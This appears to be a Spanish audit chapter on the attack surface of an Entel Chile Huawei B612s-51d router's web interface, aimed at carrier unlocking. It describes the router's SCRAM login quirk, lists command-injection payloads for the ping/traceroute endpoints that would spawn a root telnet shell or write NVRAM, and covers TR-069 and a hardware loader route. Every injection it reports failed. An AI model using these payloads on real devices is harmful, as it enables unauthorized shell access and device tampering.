# 🛡️ Capítulo 12: Auditoría Avanzada de Vectores de Software en Red Local

## 1. Resumen Ejecutivo de la Investigación
Durante esta fase se exploraron exhaustivamente los vectores de explotación remota y local sobre la interfaz Web del router **Huawei B612s-51d (CUST-C110, Entel Chile)** sin requerir apertura física del equipo:

1. **Resolución Criptográfica del Handshake SCRAM-SHA256 (RFC 5802 en HiLink).**
2. **Fuzzing de Inyección de Comandos en Endpoints de Diagnóstico (Ping / Traceroute).**
3. **Auditoría del Protocolo de Gestión Remota TR-069 (CWMP / ACS).**
4. **Mapeo Integral de Superficie de Ataque de la WebUI.**

---

## 2. Descubrimiento Criptográfico: Inversión de Parámetros en SCRAM de Huawei
Al analizar la implementación de `libjquery.js` (`CryptoJS.SCRAM`), se identificó la razón por la cual las implementaciones estándar de SCRAM fallaban contra el router:

### Discrepancia en la función Helper HMAC:
En la librería `libjquery.js` del router:
```javascript
// _createHmacHelper de CryptoJS invierte el orden:
// return function(mensaje, clave) { return HMAC(hasher, clave).finalize(mensaje); }

// Por ende, la llamada:
clientKey: function(saltPwd) { return this.cfg.hmac(saltPwd, "Client Key"); }
// Pasa: mensaje = saltPwd, clave = "Client Key"
```

### Corrección en Python / Node.js:
* **Salted Password:** `spwd = PBKDF2(password, salt, iterations, SHA256)`
* **Client Key:** `HMAC(key="Client Key", msg=spwd, SHA256)`
* **Stored Key:** `SHA256(client_key)`
* **Client Signature:** `HMAC(key=auth_message, msg=stored_key, SHA256)`
* **Client Proof:** `client_key XOR client_signature`

Con esta corrección, se logró una **autenticación 100% exitosa** con credenciales de administrador (`admin` / `admin`), obteniendo `State: 0`, `userlevel: 2`.

---

## 3. Fuzzing de Inyección de Comandos en Diagnóstico

Se desarrolló el script `fuzz_diag_injection.py` para evaluar vulnerabilidades de inyección en la línea de comandos de Linux embebido:

### Endpoints Evaluados:
* `/api/diagnosis/diagnose_ping`
* `/api/diagnosis/diagnose_traceroute`
* `/api/net/ping`
* `/api/net/traceroute`
* `/api/diag/ping`
* `/api/diag/traceroute`

### Payloads Probados (54 combinaciones):
* `127.0.0.1; telnetd -p 23 -l /bin/sh &`
* `127.0.0.1 | telnetd -p 23 -l /bin/sh &`
* `127.0.0.1\n telnetd -p 23 -l /bin/sh &`
* `$(telnetd -p 23 -l /bin/sh &)`
* `` `telnetd -p 23 -l /bin/sh &` ``
* `127.0.0.1; /bin/busybox telnetd -p 23 &`
* `127.0.0.1; /system/bin/adbd &`
* `127.0.0.1; atc at^nvwrex=8268,0,12,1,0,0,0,2,0,0,0,a,0,0,0 &`

### Resultado Técnico:
Todos los endpoints devolvieron error `100003` (Módulo no implementado / arrancado del binario del servidor web). No hubo apertura de puertos `23` ni `5555`.

---

## 4. Auditoría de TR-069 (CWMP / Auto-Configuration Server)

Se auditó la viabilidad de montar un servidor ACS local en PC (`http://192.168.8.x:7547`) para inyectar comandos RPC `Download` o `SetParameterValues`:

### Hallazgos:
* En `/api/global/module-switch`, el flag `<cwmp_enabled>1</cwmp_enabled>` está activo en la capa visual.
* Sin embargo, al invocar los endpoints de configuración:
  * `/api/cwmp/basic-info` $\rightarrow$ `100003`
  * `/api/cwmp/settings` $\rightarrow$ `100003`
  * `/api/tr069/basic-info` $\rightarrow$ `100003`

Esto confirma que la compilación de Entel Chile eliminó la infraestructura de control CWMP desde la WebUI.

---

## 5. Matriz de Superficie de Ataque WebUI (Entel CUST-C110)

| Vector Evaluado | Estado en Firmware | Viabilidad de Explotación |
| :--- | :---: | :---: |
| **Local Firmware Upload** (`/api/filemanager/upload`) | Eliminado (`100003`) | ❌ Nula |
| **Comandos AT vía Web** (`/api/system/atcmd`) | Eliminado (`100003`) | ❌ Nula |
| **Inyección de Diagnóstico** (`/api/diagnosis/*`) | Eliminado (`100003`) | ❌ Nula |
| **Gestión CWMP / TR-069** (`/api/cwmp/*`) | Eliminado (`100003`) | ❌ Nula |
| **Calculador Matemático V5** | Asimétrico / HSM | ❌ Imposible Offline |
| **Código NCK Legal (Subtel Entel)** | Activo en Operador | ✅ **100% Viable (Sin Abrir)** |
| **Bypass Hardware NVRAM** (Testpoint + Shell Loader) | Verificado | ✅ **100% Viable (Hardware)** |

---

## 6. Conclusiones
El firmware `11.192.00.00.110` (CUST-B00C110) de Entel Chile presenta un endurecimiento (*hardening*) significativo en su interfaz de red local, careciendo de vectores de ejecución remota de código sin privilegios. Por consiguiente, los dos únicos caminos verificables para la liberación son:

1. **Vía Legal / Administrativa:** Solicitud gratuita del código NCK oficial a Entel (IMEI `864596030624094`).
2. **Vía Falso Bootloader en RAM:** Inyección de `usbloader-b612-shell.bin` por Testpoint USB y escritura directa en registro NVRAM `8268`.
